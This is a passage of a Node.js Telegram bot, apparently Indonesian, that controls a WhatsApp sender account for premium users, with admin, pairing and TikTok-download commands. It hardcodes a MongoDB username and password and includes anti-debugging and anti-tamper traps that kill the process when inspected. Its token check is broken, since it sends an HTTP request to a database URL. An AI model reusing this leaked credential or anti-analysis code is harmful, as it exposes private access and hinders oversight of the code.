const { Telegraf } = require("telegraf");
const { spawn, spawnSync } = require("child_process");
const { pipeline } = require("stream/promises");
const { createWriteStream } = require("fs");
const fs = require("fs");
const path = require("path");
const jid = "0@s.whatsapp.net";
const vm = require("vm");
const os = require("os");
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@bellaxchuu/xbailey");
//============( CONST ) =======\\
const pino = require("pino");
const crypto = require("crypto");
const mongoose = require("mongoose");
const chalk = require("chalk");
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./settings/config");
const axios = require("axios");
const moment = require("moment-timezone");
const EventEmitter = require("events");
const makeInMemoryStore = ({ logger = console } = {}) => {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on("messages.upsert", ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;
      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 100) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp,
      };
    }
  });

  ev.on("chats.set", ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on("contacts.set", ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: evTarget => {
      evTarget.on("messages.upsert", m => ev.emit("messages.upsert", m));
      evTarget.on("chats.set", c => ev.emit("chats.set", c));
      evTarget.on("contacts.set", c => ev.emit("contacts.set", c));
    },
    logger,
  };
};

const thumbnailUrl = "https://files.catbox.moe/42f1il.jpg";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseURL =
  "mongodb+srv://bandingfixmerah4_db_user:Dt7zv7cbpf99D2XJ@crimson3.phfzsjt.mongodb.net/?appName=Crimson3";

function activateSecureMode() {
  secureMode = true;
}

const tokenSchema = new mongoose.Schema({
  userId: { type: String, index: true },
  tokens: { type: [String], default: [] },
  updatedAt: { type: Date, default: Date.now },
});

const TokenDB = mongoose.model("Token", tokenSchema, "tokens");

async function connectDB() {
  try {
    await mongoose.connect(databaseURL);
    console.log("✅ MongoDB Connected Successfully");
    return true;
  } catch (error) {
    console.error("❌ MongoDB Connection Failed:", error.message);
    process.exit(1);
  }
}

(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(
      chalk.cyan(`==============================================
⠀⠀⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
  `)
    );
    console.log(
      chalk.cyan(`
━━━━━━━━━━━━━━━━━━━━━━━
  ⛥ S ᗩ ᒪ ᐯ ᗩ ᗪ O ᖇ ⛥
━━━━━━━━━━━━━━━━━━━━━━━
ⓘ Information:
.ᐟ Developer : Parkyoujoung
.ᐟ Version : 1.0 [ New Release ]
`)
    );
}

  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (
        process.exit.toString().includes("Proxy") ||
        process.kill.toString().includes("Proxy")
      ) {
        console.log(
          chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
        );
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(
            chalk.bold.red(`
  BYPASS DETECTED!!
  YOUR BYPASS TOOLS ARE VERY BAD IDIOT.
  `)
          );
          activateSecureMode();
          hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
  //============( VALIDATE TOKEN ) =======\\


})();

const question = query =>
  new Promise(resolve => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, answer => {
      rl.close();
      resolve(answer);
    });
  });

async function isAuthorizedToken(token) {
  try {
    const res = await axios.get(databaseURL);
    const authorizedTokens = res.data.tokens;
    return authorizedTokens.includes(token);
  } catch (e) {
    return false;
  }
}

//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);

bot.use((ctx, next) => {
  if (secureMode) return;
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let lastPairingMessage = null;
let reconnectTimer = null;
let reconnectAttempts = 0;
let sessionStarting = false;
let waConnectionState = "connecting";
let pairingInProgress = false;
const MAX_RECONNECT_ATTEMPTS = 10;
const usePairingCode = true;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const premiumFile = "./database/premium.json";
const cooldownFile = "./database/cooldown.json";

const loadPremiumUsers = () => {
  try {
    const data = fs.readFileSync(premiumFile);
    return JSON.parse(data);
  } catch (err) {
    return {};
  }
};

const savePremiumUsers = users => {
  fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
  const premiumUsers = loadPremiumUsers();
  const expiryDate = moment()
    .add(duration, "days")
    .tz("Asia/Jakarta")
    .format("DD-MM-YYYY");
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  return expiryDate;
};

const removePremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  delete premiumUsers[userId];
  savePremiumUsers(premiumUsers);
};

const isPremiumUser = userId => {
  const premiumUsers = loadPremiumUsers();
  if (premiumUsers[userId]) {
    const expiryDate = moment(premiumUsers[userId], "DD-MM-YYYY");
    if (moment().isBefore(expiryDate)) {
      return true;
    } else {
      removePremiumUser(userId);
      return false;
    }
  }
  return false;
};

//============ FUNCTION PREMIUM GROUP =======\\
const premiumGroupFile = './database/premiumGroups.json';
const premiumGroups = new Map();

function loadPremiumGroups() {
    try {
        if (fs.existsSync(premiumGroupFile)) {
            const data = fs.readFileSync(premiumGroupFile, 'utf8');
            const parsed = JSON.parse(data);
            premiumGroups.clear();
            Object.entries(parsed).forEach(([key, value]) => {
                premiumGroups.set(key, value);
            });
        }
        return premiumGroups;
    } catch (error) {
        console.error('Error loading premium groups:', error);
        return premiumGroups;
    }
}

function savePremiumGroups() {
    try {
        const data = Object.fromEntries(premiumGroups);
        fs.writeFileSync(premiumGroupFile, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error saving premium groups:', error);
        return false;
    }
}

function isGroupPremium(groupId) {
    if (!premiumGroups.has(groupId)) return false;
    
    const data = premiumGroups.get(groupId);
    if (data.expiredAt && Date.now() > data.expiredAt) {
        premiumGroups.delete(groupId);
        savePremiumGroups();
        return false;
    }
    return true;
}

function getPremiumGroupData(groupId) {
    return premiumGroups.get(groupId) || null;
}

function getAllPremiumGroups() {
    const result = [];
    for (const [groupId, data] of premiumGroups) {
        if (data.expiredAt && Date.now() > data.expiredAt) {
            premiumGroups.delete(groupId);
            savePremiumGroups();
            continue;
        }
        result.push({ groupId, ...data });
    }
    return result;
}

function isValidId(id) {
    return id && (id.startsWith('-100') || id.startsWith('@')) && id.length > 5;
}

function addPremiumGroup(groupId, duration, adminId) {
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    if (isNaN(duration) || duration < 1) {
        return { success: false, message: 'Durasi harus berupa angka dalam hari!' };
    }

    if (isGroupPremium(groupId)) {
        return { success: false, message: 'Grup ini sudah terdaftar sebagai premium!' };
    }

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + duration);

    const data = {
        admin: adminId,
        addedAt: Date.now(),
        duration: duration,
        expiredAt: expiryDate.getTime()
    };

    premiumGroups.set(groupId, data);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium sampai ${expiryDate.toLocaleDateString()}`,
        data: data
    };
}

function deletePremiumGroup(groupId) {
    if (!isValidId(groupId)) {
        return { success: false, message: 'ID grup tidak valid!' };
    }

    if (!isGroupPremium(groupId)) {
        return { success: false, message: `Group ${groupId} bukan premium!` };
    }

    premiumGroups.delete(groupId);
    savePremiumGroups();

    return {
        success: true,
        message: `Group ${groupId} premium dihapus!`
    };
}

loadPremiumGroups();

const loadCooldown = () => {
  try {
    const data = fs.readFileSync(cooldownFile);
    return JSON.parse(data).cooldown || 5;
  } catch {
    return 5;
  }
};

const saveCooldown = seconds => {
  fs.writeFileSync(
    cooldownFile,
    JSON.stringify({ cooldown: seconds }, null, 2)
  );
};

let cooldown = loadCooldown();
const userCooldowns = new Map();

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const scheduleReconnect = (reason) => {
  if (reconnectTimer || sessionStarting) return;
  if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
    console.error(`[WhatsApp] Reconnect dihentikan setelah ${MAX_RECONNECT_ATTEMPTS} percobaan. Gunakan /addsender untuk mencoba ulang.`);
    return;
  }
  reconnectAttempts += 1;
  const delay = Math.min(5000 * 2 ** (reconnectAttempts - 1), 60000);
  console.log(`[WhatsApp] Reconnect percobaan ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} dalam ${Math.ceil(delay / 1000)} detik (${reason || "connection closed"}).`);
  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    startSesi().catch(error => scheduleReconnect(error.message));
  }, delay);
};

const startSesi = async () => {
  if (sessionStarting) return;
  sessionStarting = true;
  try {
   const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    waConnectionState = "connecting";
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection) waConnectionState = connection;
        if (connection === 'open') {
        sessionStarting = false;
        reconnectAttempts = 0;
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
      ᯤ  𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚  ᯤ
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {}
      }

      console.clear();
      isWhatsAppConnected = true;
      const currentTime = moment().tz("Asia/Jakarta").format("HH:mm:ss");
      console.log(chalk.bold.yellow(`Sender Connected`));
    }

    if (connection === "close") {
      sessionStarting = false;
      isWhatsAppConnected = false;
      waConnectionState = "close";
      pairingInProgress = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.error?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      if (shouldReconnect) {
        scheduleReconnect(statusCode ? `status ${statusCode}` : "unknown reason");
      } else {
        reconnectAttempts = 0;
        console.log(chalk.yellow("[WhatsApp] Session logout. Pairing ulang diperlukan."));
      }
    }
  });
  } catch (error) {
    sessionStarting = false;
    isWhatsAppConnected = false;
    waConnectionState = "close";
    throw error;
  }
};

startSesi().catch(error => scheduleReconnect(error.message));
//============( CHECK ) =======\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
    return;
  }
  next();
};

const checkCooldown = (ctx, next) => {
  const userId = ctx.from.id;
  const now = Date.now();

  if (userCooldowns.has(userId)) {
    const lastUsed = userCooldowns.get(userId);
    const diff = (now - lastUsed) / 1000;

    if (diff < cooldown) {
      const remaining = Math.ceil(cooldown - diff);
      ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`);
      return;
    }
  }

  userCooldowns.set(userId, now);
  next();
};

const checkPremium = (ctx, next) => {
  const userId = ctx.from.id;
  const groupId = ctx.chat.id.toString();  
  if (isPremiumUser(userId)) return next();
  if (isGroupPremium(groupId)) return next();
  ctx.reply("❌ Akses hanya untuk premium!");
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber || phoneNumber.length < 8 || phoneNumber.length > 15) {
    return ctx.reply("❌ ☇ Nomor tidak valid. Gunakan format internasional tanpa +, contoh: 628123456789");
  }

  if (pairingInProgress) {
    return ctx.reply("⏳ ☇ Permintaan pairing sebelumnya masih diproses, tunggu sebentar");
  }

  try {
    if (!sock || !["connecting", "open"].includes(waConnectionState)) {
      return ctx.reply(`❌ ☇ Socket WhatsApp belum siap (status: ${waConnectionState}). Tunggu beberapa detik lalu coba lagi`);
    }
    pairingInProgress = true;
    if (sock.authState.creds.registered) {
      return ctx.reply(
        `✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`
      );
    }

    const code = await sock.requestPairingCode(phoneNumber, "SALVADOR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    if (!formattedCode) throw new Error("PAIRING_CODE_EMPTY");

    const pairingMenu = `\`\`\`js
   ᯤ  𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚  ᯤ
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: pairingMenu,
      parse_mode: "Markdown",
    });

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode,
    };
  } catch (err) {
    console.error("Pairing gagal:", err);
    const message = String(err?.message || err);
    if (/408|connection closed|timed out/i.test(message)) {
      await ctx.reply("❌ ☇ Koneksi WhatsApp tertutup sebelum pairing selesai. Tunggu reconnect selesai, lalu coba `/addsender` lagi.");
    } else {
      await ctx.reply(`❌ ☇ Pairing gagal: ${message.slice(0, 300)}`);
    }
  } finally {
    pairingInProgress = false;
  }
});

if (sock) {
  sock.ev.on("connection.update", async update => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
   ᯤ  𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗣𝗔𝗜𝗥𝗜𝗡𝗚  ᯤ
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected
\`\`\``;

      try {
        await bot.telegram.editMessageCaption(
          lastPairingMessage.chatId,
          lastPairingMessage.messageId,
          undefined,
          updateConnectionMenu,
          { parse_mode: "Markdown" }
        );
      } catch (e) {}
    }
  });
}

bot.command("setcd", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ");
  const seconds = parseInt(args[1]);

  if (isNaN(seconds) || seconds < 0) {
    return ctx.reply("🪧 ☇ Format: /setcd 5");
  }

  cooldown = seconds;
  saveCooldown(seconds);
  ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsesi", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ============ FUNCTION ADD ADMIN ============
const adminFile = path.join(__dirname, 'admin.json');

const loadAdmin = () => {
    try {
        if (fs.existsSync(adminFile)) {
            const data = fs.readFileSync(adminFile, 'utf8');
            return JSON.parse(data);
        }
        return [];
    } catch (err) {
        console.error('❌ Error loading admin:', err);
        return [];
    }
};

const saveAdmin = (adminList) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(adminList, null, 2));
        console.log('✅ Admin saved successfully');
    } catch (err) {
        console.error('❌ Error saving admin:', err);
    }
};

let adminList = loadAdmin();

const isAdmin = (userId) => {
    return adminList.includes(parseInt(userId));
};

// ============ COMMAND ADD ADMIN ============
bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
        return ctx.reply("❌ Masukkan ID user.\nContoh: /addadmin 123456789");
    }

    const newAdmin = parseInt(args[0].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(newAdmin)) {
        return ctx.reply("❌ Input tidak valid.\nContoh: /addadmin 6843967527");
    }

    if (newAdmin === ownerID) {
        return ctx.reply("❌ Owner sudah memiliki akses penuh!");
    }

    if (!adminList.includes(newAdmin)) {
        adminList.push(newAdmin);
        saveAdmin(adminList);
        ctx.reply(`✅ User ${newAdmin} berhasil ditambahkan sebagai admin.`);
    } else {
        ctx.reply(`❌ User ${newAdmin} sudah menjadi admin.`);
    }
});

// ============ COMMAND DEL ADMIN ============
bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length === 0) {
        return ctx.reply("❌ Masukkan ID user.\nContoh: /deladmin 123456789");
    }

    const targetAdmin = parseInt(args[0].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(targetAdmin)) {
        return ctx.reply("❌ Input tidak valid.\nContoh: /deladmin 6843967527");
    }

    if (targetAdmin === ownerID) {
        return ctx.reply("❌ Tidak bisa menghapus owner!");
    }

    const adminIndex = adminList.indexOf(targetAdmin);
    if (adminIndex !== -1) {
        adminList.splice(adminIndex, 1);
        saveAdmin(adminList);
        ctx.reply(`✅ User ${targetAdmin} berhasil dihapus dari admin.`);
    } else {
        ctx.reply(`❌ User ${targetAdmin} bukan admin.`);
    }
});

// ============ COMMAND REACTION CHANNEL ============
bot.command('reactch', async (ctx) => {
    const userId = ctx.from.id;
    
    if (!isAdmin(userId)) {
        return ctx.reply("❌ Akses ditolak! Khusus Admin.");
    }

    const rawInput = ctx.message.text.substring(9).trim();
    if (!rawInput.includes('|')) {
        return ctx.reply("❌ Format salah!\n🪧 Contoh: /reactch 🔥 | https://t.me/c/12345/10");
    }

    const parts = rawInput.split('|');
    const emojisInput = parts[0].trim();
    const linkInput = parts[1].trim();

    const emojiArray = Array.from(emojisInput).filter(e => e.trim() !== '');
    if (emojiArray.length === 0) return ctx.reply("❌ Emoji tidak terdeteksi!");
    const singleEmoji = emojiArray[0];
    const reactions = [{ type: "emoji", emoji: singleEmoji }];

    let chatId, messageId;
    try {
        if (linkInput.includes('/c/')) {
            const linkParts = linkInput.split('/c/')[1].split('/');
            chatId = "-100" + linkParts[0];
            messageId = parseInt(linkParts[1]);
        } else {
            const linkParts = linkInput.split('t.me/')[1].split('/');
            chatId = "@" + linkParts[0];
            messageId = parseInt(linkParts[1]);
        }
        await ctx.telegram.callApi('setMessageReaction', {
            chat_id: chatId,
            message_id: messageId,
            reaction: reactions
        });
        ctx.reply(`✅ Sukses memberikan reaction ${singleEmoji} ke pesan tersebut.`);
    } catch (e) {
        let errorMsg = e.message;
        if (errorMsg.includes("REACTION_INVALID")) {
            errorMsg = "Emoji ditolak Channel (Coba pakai emoji dasar tanpa warna kulit).";
        }
        ctx.reply(`❌ Gagal: ${errorMsg}`);
    }
});

// ============ COMMAND /addprem ============
bot.command("addprem", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 3) {
    return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
  }
  const userId = args[1];
  const duration = parseInt(args[2]);
  if (isNaN(duration)) {
    return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
  }
  const expiryDate = addPremiumUser(userId, duration);
  ctx.reply(
    `✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`
  );
});

// ============ COMMAND /delprem ============
bot.command("delprem", async ctx => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 ☇ Format: /delprem 12345678");
  }
  const userId = args[1];
  removePremiumUser(userId);
  ctx.reply(
    `✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`
  );
});

// ============ COMMAND /addpremgb ============
bot.command('addpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    
    if (args.length < 3) {
      return ctx.reply('❌ Format: /addpremgb -1001234567890 30');
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (!isValidId(groupId)) {
      return ctx.reply('❌ ID grup tidak valid!');
    }

    if (isNaN(duration) || duration < 1) {
      return ctx.reply('❌ Durasi harus berupa angka dalam hari!');
    }

    if (isGroupPremium(groupId)) {
      return ctx.reply('⚠️ Grup ini sudah terdaftar sebagai premium!');
    }

    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + duration);

    const data = loadPremiumGroups();
    data[groupId] = {
      admin: ctx.from.id,
      addedAt: Date.now(),
      duration: duration,
      expiredAt: expiryDate.getTime()
    };
    savePremiumGroups(data);

    ctx.reply(`✅ Group ${groupId} premium sampai ${expiryDate.toLocaleDateString()}`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.command('delpremgb', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
      return ctx.reply('❌ Format: /delpremgb -1001234567890');
    }

    const groupId = args[1];

    if (!isValidId(groupId)) {
      return ctx.reply('❌ ID grup tidak valid!');
    }

    if (!isGroupPremium(groupId)) {
      return ctx.reply(`❌ Group ${groupId} bukan premium!`);
    }

    const data = loadPremiumGroups();
    delete data[groupId];
    savePremiumGroups(data);

    ctx.reply(`✅ Group ${groupId} premium dihapus!`);
  } catch (error) {
    ctx.reply(`❌ Terjadi kesalahan: ${error.message}`);
  }
});

// ============ COMMAND /tiktokdl ============
bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
